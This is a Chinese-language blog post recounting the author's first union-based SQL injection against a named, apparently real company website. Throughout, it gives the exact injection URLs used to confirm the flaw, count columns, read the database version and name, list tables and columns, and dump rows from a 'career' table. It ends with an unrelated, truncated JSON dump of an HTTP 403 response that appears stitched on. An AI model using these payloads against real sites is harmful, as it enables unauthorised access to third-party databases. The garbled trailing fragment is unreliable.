# 记第一次sql注入（union）

目标网站是：https://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1

### 1.判断是字符型注入还是数字型注入

id=1时

```sql
https://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728195146696.png" alt="image-20220728195146696" style="zoom:33%;" />

id=2时

```sql
https://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=2
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728195047389.png" alt="image-20220728195047389" style="zoom:33%;" />

id=2-1时

```sql
https://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=2-1
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728195222677.png" alt="image-20220728195222677" style="zoom:33%;" />

`由此可以看出，该网站存在数字型注入`

### 2.判断列数

`最后推算出结果列数为6。`

```sql
https://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1 group by 6 -- 
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728195606156.png" alt="image-20220728195606156" style="zoom:33%;" />

### 3,获取回显位

将id=-1，union注入后，获得`回显位是4和5`

```sql
https://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=-1 union select 1,2,3,4,5,6 --  
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728200234803.png" alt="image-20220728200234803" style="zoom:33%;" />

### 3.查询数据库版本和数据库名称

数据库的版本：10.4.21-MariaDB

数据库名称：techmarthk_data2

```sql
https://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=-1 union select 1,2,3,version(),database(),6 --  
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728200532804.png" alt="image-20220728200532804" style="zoom:33%;" />

### 4.获取该数据库的所有表的表名

4号回显位上显示的就是该数据库下的所有表名，我选择查询`career`表里的信息。

```sql
https://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=-1 union select 1,2,3,group_concat(table_name),database(),6 from information_schema.tables where table_schema='techmarthk_data2' --  
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728201030517.png" alt="image-20220728201030517" style="zoom:33%;" />

### 5.获取career表里的所有列名

career表下所有列：career_id,career_title,career_desc,career_desc_chi,career_desc2,career_desc2_chi,career_desc3,career_desc3_chi

```sql
https://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=-1 union select 1,2,3,group_concat(column_name),database(),6 from information_schema.columns where table_name='career' --  
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728201551649.png" alt="image-20220728201551649" style="zoom:33%;" />

### 6.获取career表里的任意两列信息

```sql
https://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=-1 union select 1,2,3,group_concat(career_title),group_concat(career_desc),6 from career --  
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220728201953179.png" alt="image-20220728201953179" style="zoom:33%;" />







ng":null,"endEmitted":false,"ended":false,"flowing":true,"highWaterMark":16384,"length":0,"needReadable":true,"objectMode":false,"pipes":null,"pipesCount":0,"readableListening":false,"reading":true,"readingMore":false,"resumeScheduled":false,"sync":false},"_server":null,"_sockname":null,"_writableState":{"bufferProcessing":false,"bufferedRequest":null,"bufferedRequestCount":0,"corked":0,"corkedRequestsFree":{"entry":null,"next":{"entry":null,"next":null}},"decodeStrings":false,"defaultEncoding":"utf8","destroyed":false,"emitClose":false,"ended":true,"ending":true,"errorEmitted":false,"finalCalled":true,"finished":false,"highWaterMark":16384,"lastBufferedRequest":null,"length":0,"needDrain":false,"objectMode":false,"pendingcb":1,"prefinished":false,"sync":false,"writecb":null,"writelen":0,"writing":false},"allowHalfOpen":false,"connecting":false,"parser":null,"readable":true,"server":null,"writable":false},"statusCode":403,"statusMessage":"Forbidden","trailers":{},"upgrade":false,"url":""},"serverError":false,"status":403,"statusCode":403,"statusType":4,"type":"text/plain","unauthorized":false,"unprocessableEntity":false},"status":403}